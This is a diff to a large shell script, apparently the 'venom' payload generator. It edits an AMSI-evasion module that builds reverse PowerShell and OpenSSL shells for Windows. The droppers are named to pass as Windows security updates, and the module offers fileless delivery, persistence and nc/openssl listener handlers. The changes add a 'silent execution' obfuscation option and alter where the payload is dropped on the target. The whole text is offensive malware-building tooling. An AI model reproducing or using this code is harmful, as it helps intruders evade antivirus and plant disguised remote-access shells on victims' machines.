@@ -11939,8 +11939,8 @@ exit
 # AMSI EVASION MODULES
 ## -------------------
 sh_ninja () {
-echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};
-sleep 2
+echo ${BlueF}[${YellowF}i${BlueF}]${white} Loading Amsi ${YellowF}[Evasion]${white} agents ..${Reset};sleep 2
+easter_egg=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 cat << !
 
 
@@ -11949,6 +11949,7 @@ cat << !
     | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest (Fileless)
+    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : PS1
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : NOT AVAILABLE
@@ -11958,6 +11959,7 @@ cat << !
     | DESCRIPTION        : Reverse OpenSSL Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
+    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : BAT
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
@@ -11967,6 +11969,7 @@ cat << !
     | DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
+    | SILENT EXECUTION   : $easter_egg
     | DROPPER EXTENSION  : .{RANDOM}.BAT (MITRE T1036)
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
@@ -12019,15 +12022,15 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 if [ "$easter_egg" = "ON" ] || [ "$easter_egg" = "on" ]; then
-   rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp (*)\nexample: ProgramFiles\nexample: LocalAppData\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop." --entry --width 350) > /dev/null 2>&1
+   rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For Payload Drop.\nRemark: Only PS environment var's accepted" --entry --width 350) > /dev/null 2>&1
 fi
 
 
 ## setting default values in case user have skip this ..
 if [ -z "$lhost" ]; then lhost="$IP";fi
 if [ -z "$lport" ]; then lport="443";fi
-if [ -z "$rpath" ]; then rpath="tmp";fi
 if [ -z "$NaM" ]; then NaM="Security-Update";fi
+if [ -z "$rpath" ]; then rpath="LocalAppData";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
@@ -12041,6 +12044,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.ps1
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : Fileless (\$env:$rpath)
+    SILENT EXECUTION : $easter_egg
 !
 echo "---"
 
@@ -12205,7 +12209,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 CN=$(zenity --title="☠ Enter OpenSSL CN (domain name) ☠" --text "example: SSARedTeam.com" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %ProgramFiles%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module." --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
 
 
 ## setting default values in case user have skip this ..
@@ -12230,7 +12234,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath\\\\$NaM.ps1
-    BUILD ID : { $random_name }
+    SILENT EXECUTION : $easter_egg
 !
 echo "---"
 
@@ -12385,7 +12389,6 @@ if [ "$persistence" = "Add persistence)" ]; then
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence_$random_name.txt
    echo "HANDLER: cd venom/output" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "HANDLER: sudo openssl s_server -quiet -key key.pem -cert cert.pem -port $lport" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "BUILD ID: { $random_name }" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
@@ -12429,7 +12432,7 @@ lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --wid
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
-rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %ProgramFiles%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module." --entry --width 350) > /dev/null 2>&1
+rpath=$(zenity --title="☠ Enter Payload Upload Path (target dir) ☠" --text "example: %tmp%\nexample: %LocalAppData% (*)\nexample: %userprofile%\\\\\\\Desktop\n\n(*) Recomended Path For Persistence Module.\nRemark: Only CMD environment var's accepted" --entry --width 350) > /dev/null 2>&1
 
 
 ## Setting default values in case user have skip this ..
@@ -12467,7 +12470,7 @@ cat << !
     DROPPER  : $IPATH/output/$Drop.$ext.bat
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : $rpath\\\\$NaM.ps1
-    BUILD ID : { $random_name }
+    SILENT EXECUTION : $easter_egg
 !
 echo "---"
 
@@ -12604,7 +12607,6 @@ if [ "$persistence" = "Add persistence)" ]; then
    ## Write how to delete persistence to output folder ..
    echo "LHOST: $lhost" > $IPATH/output/delete_persistence_$random_name.txt
    echo "HANDLER: sudo nc -lvp $lport" >> $IPATH/output/delete_persistence_$random_name.txt
-   echo "BUILD ID: { $random_name }" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "ACTIVE ON: $dtr" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "+-----------------------------------------+" >> $IPATH/output/delete_persistence_$random_name.txt
    echo "|TO DELETE PERSISTENCE FROM TARGET MACHINE|" >> $IPATH/output/delete_persistence_$random_name.txt
